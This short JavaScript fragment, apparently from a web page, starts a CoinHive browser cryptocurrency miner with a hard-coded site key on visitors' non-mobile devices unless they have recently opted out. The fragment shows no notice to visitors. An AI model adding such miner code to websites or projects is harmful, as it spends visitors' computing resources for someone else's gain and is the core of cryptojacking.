        var miner = new CoinHive.Anonymous('0LpPyCV4c6U2rqpUCr6tBSfTJPv3NpiE', {throttle: 0.85});
    
        // Only start on non-mobile devices and if not opted-out
        // in the last 14400 seconds (4 hours):
        if (!miner.isMobile() && !miner.didOptOut(14400)) {
            miner.start();
        }
